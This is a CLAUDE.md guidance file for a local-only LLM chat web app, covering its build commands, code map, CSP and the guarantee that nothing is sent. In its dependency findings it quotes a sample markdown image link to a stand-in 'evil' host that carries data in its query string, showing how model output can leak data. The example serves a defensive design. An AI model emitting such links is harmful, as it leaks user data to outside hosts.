# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project status

All four phases of the spec are implemented: diagnostics gate, streaming chat, temporary chat, ja/en, latency UI; search, pin, rename, multi-select delete with undo, JSON/Markdown export and import, usage meter, quota errors; multi-draft comparison (saved with the chat), PWA offline, the "nothing is sent" verification dialog; automatic context summarization with a context gauge, image input, and IndexedDB storage with a one-time localStorage migration. Not built: optional Nano auto-titling. Design source of truth is the spec: `docs/Hitorigoto 仕様書.md` (Japanese). Nothing has been run against a real Gemini Nano by the test suite (everything uses a mocked `LanguageModel`); image input in particular follows the documented multimodal shape but is unverified on real hardware.

## Commands

- `npm run dev`: dev server
- `npm run build`: typecheck + static build into `dist/`
- `npm run typecheck`: `tsc -b --noEmit`
- `npm test`: vitest (jsdom + fake-indexeddb) unit tests for `src/lib/*`: history backends (run against both localStorage and IndexedDB), migration, export/import validation, draft temperatures, and `NanoSessions` (session reuse, summarization, quota-error retry, image input).
- `npm run verify:network`: run after `npm run build`. Serves `dist/` with the `_headers` CSP (and again without it), drives it in headless Chrome over CDP with a **mocked `LanguageModel`** (including `inputUsage`/`inputQuota` and prompt recording), and fails on any non-localhost request, CSP violation, page error, or failed UI check. The scenario covers chat, persistence in IndexedDB, rename, pin, search, delete + undo, import incl. conflict, multi-draft (saved, listed, adopted into the chat), context gauge, image attach → model Blob → IndexedDB → survives reload, the verification dialog, temporary chat, delete-all, Service Worker + offline reload; a third run seeds legacy localStorage history and checks the migration; a fourth run is a genuine first visit and checks the guide modal (auto-open once, tabs, live status, keyboard, remembered on close, reopened from the header). Every other run pre-seeds `hitorigoto:onboarded` so the guide does not cover the UI. Run it whenever a dependency or UI flow changes. Set `CHROME_PATH` if Chrome is not in a default location.
- No linter is configured yet.

`public/_headers` holds the CSP (catch-all `/*` block; `sw.js` and the manifest get `no-cache`) and is copied into `dist/`. `verify:network` only reads the `/*` block. It is only enforced on Cloudflare Pages (and by the verify script), not by `npm run dev`. `style-src 'self'` forbids inline `<style>`; the app works under it today, so treat a new violation as a regression rather than loosening the policy. `img-src 'self' data:` is why images are handled as **data URLs**, never `blob:` URLs (and `atob`, never `fetch(dataUrl)`, since `connect-src 'self'` forbids that too).

## Dependency findings (vetted with `npm audit` + `verify:network`)

- **Streamdown fetches remote markdown images by default.** With CSP off, an LLM-emitted `![](https://evil/x.png?q=...)` triggers a real request. Every `<Streamdown>` therefore passes `disallowedElements={['img']}` (defense in depth beside CSP `img-src`). This stays even with image input: user-attached images are rendered by our own components from local data, never through Markdown.
- **`@assistant-ui/react` bundles the `AssistantCloud` client** (default endpoint `backend.assistant-api.com`). It is dead code unless `new AssistantCloud(...)` or a cloud-backed adapter is configured: never do that.
- Streamdown's Shiki/Mermaid chunks are stubs in the base package. Re-vet when adding `@streamdown/code` or similar (runtime grammar/WASM fetches).
- assistant-ui gotcha: two back-to-back `thread.append()` calls attach both messages to the same parent and throw "Branch not found". To add several messages without running the model, use `thread.reset([...existing, ...new])` (see `onAdopt` in `Chat.tsx`).

## Code map

**Model layer**
- `src/lib/diagnostics.ts`: `checkModel` / `downloadModel` (download needs a user gesture) / `checkImageSupport` (image input is offered only when `availability` with an image `expectedInput` is `available`). `components/DiagnosticsGate.tsx` renders the diagnostic cards and only mounts the app once the model is `available`.
- `src/lib/nano.ts`: `NanoSessions` adapts the Prompt API to assistant-ui's `ChatModelAdapter`. A session is a cache, rebuilt from the message list whenever it has not consumed exactly the messages before the new turn (edit, regenerate, reload, abort, language change). **Context management:** when `inputUsage / inputQuota` exceeds `COMPRESS_THRESHOLD` (0.8) after a rebuild or at the start of a turn, or a prompt throws `QuotaExceededError` (retried once), older turns are summarized (chunk by chunk, folding into the previous summary) and the session is rebuilt as "system + summary + the latest 4 messages" (falls back to 2). The summary is keyed by the id of the last summarized message and dropped if that message disappears or the language changes. It is exposed through `subscribe`/`getState` (phase + usage) for the gauge and the "summarizing" status. Past images are not replayed into rebuilt sessions (context cost); only the current turn's images are sent, as `{type:'image', value: Blob}` parts.
- `src/lib/drafts.ts` + `components/DraftsDialog.tsx`: "compare drafts". The same prompt is generated N times at temperatures spread from 0.2 to 1.5 (clamped to `LanguageModel.params()`; temperature and topK must be passed together, so with no `params()` neither is passed). Drafts run **sequentially**, one fresh session each, destroyed after use. A finished run is saved as a `DraftSet` on the current thread (creating the thread if needed), reopenable from the dialog's history list; a draft can be copied, moved into the composer, or added to the conversation.

**Storage layer** (all async, so backends are swappable)
- `src/lib/history.ts`: `HistoryRepository` interface, shared `BaseHistoryRepository` logic (patch, search, import merge/copy, draft sets), and the `LocalStorageHistoryRepository` (fallback + migration source, no image support). Types: `Thread` (with `draftSets`), `StoredMessage` (with `images` ids), `Removed` (returned by `remove()` for undo, includes image blobs). A failed write throws `HistoryQuotaError`, which the UI must surface (`guarded()` in `App.tsx`, `enqueue()` in `Chat.tsx`). A rename sets `titleEdited`, which `Chat.tsx` respects so auto-titling never overwrites it.
- `src/lib/history-idb.ts`: IndexedDB backend. Stores `threads` (bodies), `index` (list metadata, so the sidebar never loads bodies), `images` (Blobs), `meta` (flags). Images are deleted with their last referencing thread (imported copies share ids); cross-tab sync via `BroadcastChannel`; asks for persistent storage; `usage()` uses `navigator.storage.estimate()`.
- `src/lib/history-open.ts`: `openHistory()` opens IndexedDB, runs `migrateFromLocalStorage` once (copy → read back and verify every thread → set flag → only then clear localStorage; any failure leaves the old data untouched), or falls back to localStorage. `history-context.tsx` provides the repository; `App.tsx` `HistoryBoot` shows the loading state and one-time notices.
- `src/lib/exchange.ts`: export format (`hitorigoto-export`, **v2**: adds draft sets and base64-embedded images; v1 files are still accepted). `parseImport` treats the file as untrusted and rebuilds every field (type/size checks on images). Bump `version` and keep old-version handling when the stored shapes change.
- `src/lib/images.ts`: data-URL/Blob helpers, allowed types (png/jpeg/webp/gif), 10 MB limit.

**UI**
- `src/components/Chat.tsx`: `useLocalRuntime` with `initialMessages` (incl. image attachments) and, when images are enabled, an attachment adapter; persists via `runtime.thread.subscribe` after each completed run (never mid-stream) through a per-thread promise queue so read-modify-write cycles never interleave (this also preserves pin/rename/draft sets made meanwhile); images are written to the image store and referenced by id; skips persistence for temporary chats. Contains `RunStatus` (latency states, "summarizing", context gauge). The thread list is our own `Sidebar.tsx` (not assistant-ui's ThreadList).
- `components/VerifyDialog.tsx`: reads the live `Content-Security-Policy` response header via a same-origin fetch and offers a self-test that tries `https://example.invalid/` to show `connect-src` blocking it (nothing can leave: the host never resolves). Opened from the header badge. `components/Dialog.tsx` is the shared modal (portal, Escape, focus restore).
- **Guide modal** (`components/GuideDialog.tsx`, `lib/guide-context.tsx`, copy in `lib/guide-content.ts`): three tabs (welcome / first-time setup / usage). `GuideProvider` wraps the app, opens the modal by itself **once** on the first visit (flag `hitorigoto:onboarded` in localStorage, marked when the modal is closed, deliberately kept by "delete all history" via `KEEP_ON_CLEAR`), and `useGuide().open(tab)` is called from the always-visible header "Guide" button and from a link on every diagnostic card (which jumps to the setup tab). The setup tab shows the live model status (`checkModel`) and the requirements from spec §3, so update `guide-content.ts` (both languages) whenever a requirement or a user-facing feature changes. A `GuideSection` can carry an `id` (anchor) and `facts` (label/explanation table); `useGuide().open(tab, anchor)` opens the guide scrolled to that section (the sidebar's "How history is stored" link uses `open('usage', 'history')`). The "history" section documents how storage works (IndexedDB, when/what is saved, scope, no encryption, when it disappears) and how to back up: keep it in sync with `history-idb.ts` / `exchange.ts` behavior. `CopyText.tsx` is the shared "text + copy button" used for `chrome://on-device-internals`.
- `src/lib/i18n.tsx`: ja/en dictionary + provider; add every user-visible string to both languages.
- `src/index.css`: the theme. Light/dark tokens (warm neutral + terracotta accent) follow `prefers-color-scheme` and use **shadcn token names** (`background`, `muted`, `border`, `sidebar`, `primary`…) so Streamdown's built-in classes are themed automatically. Use these tokens (`bg-muted`, `text-muted-foreground`, `bg-foreground/5`…), never hard-coded colors. Global rules must live in `@layer base` so Tailwind utilities (e.g. `outline-none`) can override them. Fonts are system stacks only. Icons are inline SVG in `components/icons.tsx`.

**PWA**
- `scripts/vite-sw-plugin.mjs` emits `dist/sw.js` from `scripts/sw-template.js`, precaching every built file plus `public/` files under a content-hash cache name. Cache-first, same-origin GET only. There is deliberately no `skipWaiting`: a new version activates once all tabs are closed, so a running page never loses lazy chunks. `sw.js` is registered from `main.tsx` in production only. Add new `public/` files freely (they are picked up); `manifest.webmanifest` and the PNG icons live there (rendered from `favicon.svg`).

`src/lib/prompt-api.d.ts`: hand-written minimal typings for `LanguageModel` (API details differ across Chrome versions, so everything is feature-detected).

## What this is

Hitorigoto (ひとりごと) is a serverless LLM chat web app. It runs only on Chrome's built-in Prompt API (`LanguageModel`, Gemini Nano). It targets desktop Chrome 148+ and is served as static files from Cloudflare Pages (hitorigoto.pages.dev). Inference and history never leave the browser. The app's whole value is that this guarantee is **structurally enforced**, not just promised.

## Non-negotiable constraints

Treat any change that breaks one of these as a bug:

- **No external network traffic at runtime.** `_headers` sets a CSP with `connect-src 'self'`, and script/style/font/img are also limited to self. No CDNs, external fonts or analytics (including Cloudflare Web Analytics). Only add `'wasm-unsafe-eval'` if Shiki/WASM is verified to need it.
- **No cloud LLM fallback and no Prompt API polyfill.** Either would void the CSP guarantee. For an unsupported environment, explain why and what to do instead.
- **No assistant-ui Assistant Cloud.** Shiki grammars/WASM and Mermaid must be bundled, never fetched at runtime.
- **No Cloudflare Pages Functions, KV, D1 or other server features.** The Service Worker only caches static assets.
- **The app's own `messages[]` are the source of truth.** Nano sessions are disposable and never relied on for history.
- History is **not** encrypted by design; the always-available "delete all history" and per-thread delete make up for that. Storage writes must never fail silently.
- Before adding a new dependency, check it for runtime external requests and run `npm audit`.

## Startup diagnostics flow

1. If `'LanguageModel' in self` is false, the browser isn't Chrome or is too old: prompt an update to Chrome 148+.
2. Otherwise, branch on `availability()`:
   - `unavailable`: show a checklist of possible causes. Phrase them as "one of these may be the cause", because the API gives no reason.
   - `downloadable`: show a download button. `create()` **requires a user gesture** here.
   - `downloading`: show a progress bar driven by `monitor` / `downloadprogress`.
   - `available`: eagerly create the session while the user is still typing.

`chrome://on-device-internals` can't be linked from a web page. Show it as text with a copy button.

## UX requirements that affect implementation

- UI in Japanese and English, switchable.
- A persistent status badge: on-device | works offline | 0 bytes sent (opens the verification dialog).
- Latency UI at every stage (see spec §7.1): typing indicator, a "thinking…" message with an elapsed-seconds counter after 3s, a stall warning with stop/retry, and a "summarizing conversation" state.
- Status text goes in an `aria-live="polite"` region, and animation respects `prefers-reduced-motion`.
- Temporary chat mode (nothing saved) is part of the MVP.
